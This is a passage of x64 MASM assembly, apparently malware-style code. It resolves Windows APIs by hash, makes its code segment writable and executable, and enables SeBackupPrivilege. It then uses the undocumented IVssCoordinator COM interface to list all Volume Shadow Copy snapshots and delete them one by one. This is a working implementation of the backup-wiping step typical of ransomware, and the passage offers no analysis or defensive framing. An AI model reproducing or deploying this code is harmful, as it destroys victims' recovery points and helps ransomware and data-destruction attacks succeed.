		mov qword ptr [rsp + 0A0h].UNICODE_STRING.Buffer, r10                                      ;
		mov dword ptr [rsp + 0A0h].UNICODE_STRING._Length, 16h                                     ; strlen(Buffer)
		mov dword ptr [rsp + 0A0h].UNICODE_STRING.MaximumLength, 18h                               ; sizeof(Buffer)

		xor rcx, rcx                                                                               ; PathToFile 
		xor rdx, rdx                                                                               ; Flags
		mov r8, rsp                                                                                ; ModuleFileName
		add r8, 0A0h                                                                               ;
		mov r9, rsp                                                                                ; ModuleHandle 
		add r9, 0D0h                                                                               ; 
		mov rax, [rsp + 50h]                                                                       ; Address of LdrLoadDll
		call rax                                                                                   ; Call LdrLoadDll function

		; Get address of CoCreateInstance, CoInitializeEx, CoInitializeSecurity, CoUninitialize
		mov rdx, [rsp + 0D0h]                                                                      ; Module base
		mov rcx, 04h                                                                               ; Number of function to resolve
		mov r8, rsp                                                                                ; Address of the hashes
		add r8, 34h                                                                                ;
		mov r9, rsp                                                                                ; Address of the function pointers
		add r9, 78h                                                                                ;
		call ResolveFunctionAddresses                                                              ; Call ResolveFunctionAddresses

;----------------------------------------------------------------------------------------------------------------------
; 2. Make the code segment RWX in order to be able to initialise and exec the 
; various COM interfaces.
;----------------------------------------------------------------------------------------------------------------------
		lea rcx, Objects                                                                           ; lpAddress
		mov rdx, 1000h                                                                             ; dwSize
		mov r8, 40h                                                                                ; flNewProtect
		lea r9, [rsp + 20h]                                                                        ; lpflOldProtect
		mov rax, [rsp + 70h]                                                                       ; Address of VirtualProtect
		call rax                                                                                   ; Call VirtualProtect function
		test eax, eax                                                                              ;
		jz _epilogue                                                                               ;

;----------------------------------------------------------------------------------------------------------------------
; 3. Copy the function pointer in memory.
;----------------------------------------------------------------------------------------------------------------------
		mov rsi, rsp                                                                               ; Source 
		add rsi, 50h                                                                               ;
		mov rdi, [Functions]                                                                       ; Destination
		xor ecx, ecx                                                                               ; Number of function pointers
		add ecx, 09h                                                                               ; 
	_function_move_loop:
		movsq                                                                                      ; Move data
		loop _function_move_loop                                                                   ;

;----------------------------------------------------------------------------------------------------------------------
; 4. Ensure that the current thread inpersonation token as the SeBackupPrivilege privilege.
;----------------------------------------------------------------------------------------------------------------------
		xor rcx, rcx                                                                               ; Privilege
		add cx, 11h                                                                                ;
		xor rdx, rdx                                                                               ; EnablePrivilege
		inc dx                                                                                     ;
		xor r8, r8                                                                                 ; IsThreadPrivilege
		mov r9, rsp                                                                                ; PreviousValue
		add r9, 20h                                                                                ; 
		call RtlAdjustPrivilege                                                                    ; Call RtlAdjustPrivilege
		test eax, eax                                                                              ;
		jnz _epilogue                                                                              ;

;----------------------------------------------------------------------------------------------------------------------
; 5. Initialise COM context and security context.
; Additonally disable structured exception handler.
;----------------------------------------------------------------------------------------------------------------------
		xor ecx, ecx                                                                               ; pvReserved
		xor edx, edx                                                                               ; dwCoInit
		call CoInitializeEx                                                                        ; Call CoInitializeEx
		test eax, eax                                                                              ;
		jnz _epilogue                                                                              ;

		; Initialise COM security context
		xor ecx, ecx                                                                               ; pSecDesc
		mov rdx, 0FFFFFFFFFFFFFFFFh                                                                ; cAuthSvc
		xor r8, r8                                                                                 ; asAuthSvc
		xor r9, r9                                                                                 ; pReserved1
		mov qword ptr [rsp + 20h], 06h                                                             ; dwAuthnLevel
		mov dword ptr [rsp + 28h], 02h                                                             ; dwImpLevel
		mov qword ptr [rsp + 30h], 00h                                                             ; pAuthList
		mov dword ptr [rsp + 38h], 00h                                                             ; dwCapabilities
		mov dword ptr [rsp + 40h], 00h                                                             ; pReserved3
		call CoInitializeSecurity                                                                  ; Call CoInitializeSecurity
		test eax, eax                                                                              ;
		jnz _epilogue                                                                              ;

		; Get the IGlobalOptions interface
		lea rcx, CLSID_GlobalOptions                                                               ; rclsid
		xor rdx, rdx                                                                               ; pUnkOuter
		xor r8, r8                                                                                 ; dwClsContext (CLSCTX_INPROC_SERVER)
		inc r8                                                                                     ; 
		lea r9, IID_GlobalOptions                                                                  ; riid
		lea r10, GlobalOptions                                                                     ; ppv
		mov qword ptr [rsp + 20h ], r10                                                            ;
		call CoCreateInstance                                                                      ; Call CoCreateInstance
		test eax, eax                                                                              ;
		jnz _epilogue                                                                              ;

		; Disable SEH
		mov rcx, qword ptr [GlobalOptions]                                                         ; This
		xor edx, edx                                                                               ; dwProperty
		inc edx                                                                                    ;
		xor r8, r8                                                                                 ; dwValue
		inc r8                                                                                     ;
		mov rax, qword ptr [rcx]                                                                   ; Address of GlobalOptions::Set
		call [rax].GlobalOptionsVtbl.Set                                                           ; Call GlobalOptions::Set
		test eax, eax                                                                              ;
		jnz _epilogue                                                                              ;

		; Cleanup
		mov rax, qword ptr [GlobalOptions]                                                         ; Address of GlobalOptions::Release
		mov rax, qword ptr [rax]                                                                   ;
		call [rax].GlobalOptionsVtbl.Release                                                       ; Call GlobalOptions::Release
	
;----------------------------------------------------------------------------------------------------------------------
; 6. Get a valid pointer to a IVssCoordinator COM interface
;----------------------------------------------------------------------------------------------------------------------
		lea rcx, CLSID_VssCoordinator                                                              ; rclsid
		xor edx, edx                                                                               ; pUnkOuter
		xor r8, r8                                                                                 ; dwClsContext (CLSCTX_REMOTE_SERVER | CLSCTX_LOCAL_SERVER)
		mov r8b, 14h                                                                               ;
		lea r9, IID_VssCoordinator                                                                 ; riid
		lea r10, [VssCoordinator]                                                                  ; ppv
		mov qword ptr [rsp + 20h ], r10                                                            ;
		call CoCreateInstance                                                                      ; Call CoCreateInstance
		test eax, eax                                                                              ;
		jnz _epilogue                                                                              ;

;----------------------------------------------------------------------------------------------------------------------
; 7. Set the context
;----------------------------------------------------------------------------------------------------------------------
		mov rcx, qword ptr [VssCoordinator]                                                        ; This
		mov edx, 0FFFFFFFFh                                                                        ; p1
		mov rax, qword ptr [rcx]                                                                   ; Address of VssCoordinator::SetContext
		call [rax].VssCoordinatorVtbl.SetContext                                                   ; Call VssCoordinator::SetContext
		test eax, eax                                                                              ;
		jnz _epilogue                                                                              ;

;----------------------------------------------------------------------------------------------------------------------
; 8. Get  valid pointer to a IVssEnumObject COM interface
;----------------------------------------------------------------------------------------------------------------------
		mov rcx, qword ptr [VssCoordinator]                                                        ; This
		lea rdx, CLSID_NULL                                                                        ; p0
		xor r8, r8                                                                                 ; p1
		inc r8                                                                                     ; 
		xor r9, r9                                                                                 ; p2
		add r9, 03h                                                                                ;
		lea rax, VssEnumObject                                                                     ; p3
		mov qword ptr [rsp + 20h], rax                                                             ; 
		mov rax, qword ptr [rcx]                                                                   ; Address of VssCoordinator::Query
		call [rax].VssCoordinatorVtbl.Query                                                        ; Call VssCoordinator::Query
		cmp qword ptr [VssEnumObject], 00h                                                         ;
		jz _epilogue                                                                               ;

;----------------------------------------------------------------------------------------------------------------------
; 9. Parse each entry one by one
;----------------------------------------------------------------------------------------------------------------------
	_vss_object_prop_loop:
		mov rcx, qword ptr [VssEnumObject]                                                         ; This
		mov rdx, 01h                                                                               ; celt
		mov r8, rsp                                                                                ; rgelt
		add r8, 50h                                                                                ; 
		mov r9, r8                                                                                 ; pceltFetched
		add r8, 08h                                                                                ; 
		mov rax, qword ptr [rcx]                                                                   ; Address of VssEnumObject::Next
		call [rax].VssEnumObjectVtbl.Next                                                          ; Call VssEnumObject::Next

		; Ensure that a structure has been returned
		cmp al, 01                                                                                 ; This points to object type 
		je _vss_object_prop_end                                                                    ; 
		cmp byte ptr [rsp + 50h], 01h                                                              ; 
		jne _vss_object_prop_end                                                                   ;

		; Check the type of the object returned
		cmp [rsp + 58h]._VSS_OBJECT_PROP.ObjType, 03h                                              ; Check the object type
		jne _vss_object_prop_loop                                                                  ;

		; Delete the object
		mov rcx, qword ptr [VssCoordinator]                                                        ; This
		lea rdx, [rsp + 58h]._VSS_OBJECT_PROP.Snap.m_SnapshotId                                    ; Snapshot GUID to delete
		mov r8, 03h                                                                                ; Object type to delte
		mov r9, 01h                                                                                ; Number of objects to delete

		mov r11, rsp                                                                               ;
		add r11, 58h + sizeof _VSS_OBJECT_PROP                                                     ;
		mov qword ptr [rsp + 20h], r11                                                             ; Out INT
		add r11, 08h                                                                               ; Out GUID
		mov qword ptr [rsp + 28h], r11                                                             ; 

		mov rax, qword ptr [rcx]                                                                   ; Address of VssCoordinator::DeleteSnapshots
		call [rax].VssCoordinatorVtbl.DeleteSnapshots                                              ; Call VssCoordinator::DeleteSnapshots
		jmp _vss_object_prop_loop                                                                  ;

;----------------------------------------------------------------------------------------------------------------------
; A. Uninitialise COM context and exit.
;----------------------------------------------------------------------------------------------------------------------
	_vss_object_prop_end:
		call CoUninitialize                                                                        ; Call CoUninitialize

	_epilogue:
		mov rsp, rbp                                                                               ;
		pop rbp                                                                                    ;
	_exit:
		mov rcx, 00h                                                                               ;
		call ExitProcess                                                                           ; Exit process
	xaoc ENDP


; End of file.
_TEXT$00 ENDS
END